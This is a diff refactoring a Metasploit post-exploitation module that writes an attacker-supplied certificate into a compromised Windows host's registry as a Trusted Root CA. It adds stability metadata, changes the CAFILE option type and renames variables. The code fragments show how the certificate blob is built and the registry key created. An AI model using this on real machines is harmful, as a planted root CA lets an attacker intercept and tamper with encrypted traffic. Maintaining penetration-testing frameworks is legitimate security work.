@@ -25,13 +25,18 @@ class MetasploitModule < Msf::Post
               stdapi_registry_open_key
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
+          'Reliability' => []
         }
       )
     )
 
     register_options(
       [
-        OptString.new('CAFILE', [ true, 'Path to the certificate you wish to install as a Trusted Root CA.', ''])
+        OptPath.new('CAFILE', [ true, 'Path to the certificate you wish to install as a Trusted Root CA.', ''])
       ]
     )
   end
@@ -47,8 +52,6 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    cert = ''
-
     # Load the file
     f = ::File.open(certfile, 'rb')
     cert = f.read(f.stat.size)
@@ -59,13 +62,13 @@ class MetasploitModule < Msf::Post
     certsha1 = Digest::SHA1.hexdigest(loadedcert.to_der).scan(/../)
     cskiray = loadedcert.extensions[0].value.gsub(/:/, '').scan(/../)
 
-    derLength = loadedcert.to_der.length.to_s(16)
-    if (derLength.length < 4)
-      derLength = "0#{derLength}"
+    der_length = loadedcert.to_der.length.to_s(16)
+    if (der_length.length < 4)
+      der_length = "0#{der_length}"
     end
 
-    derRay = derLength.scan(/../)
-    hexDerLength = [ derRay[1], derRay[0] ]
+    der_ray = der_length.scan(/../)
+    hex_der_length = [ der_ray[1], der_ray[0] ]
 
     certder = loadedcert.to_der.each_byte.collect { |val| '%02X' % val }
 
@@ -76,7 +79,7 @@ class MetasploitModule < Msf::Post
     bblob += [ '14', '00', '00', '00', '01', '00', '00', '00', '14', '00', '00', '00' ]
     bblob += cskiray
     bblob += [ '20', '00', '00', '00', '01', '00', '00', '00' ]
-    bblob += hexDerLength
+    bblob += hex_der_length
     bblob += [ '00', '00' ]
     bblob += certder
 
@@ -91,7 +94,6 @@ class MetasploitModule < Msf::Post
 
     # Ensure the cert doesn't already exist
     begin
-      open_key = nil
       open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ + 0x0000)
       values = open_key.enum_value
       if !values.empty?
@@ -99,7 +101,6 @@ class MetasploitModule < Msf::Post
         return
       end
     rescue StandardError
-      open_key = nil
       open_key = client.sys.registry.create_key(root_key, base_key, KEY_WRITE + 0x0000)
       print_good("Successfully created key: #{entire_key}")
 
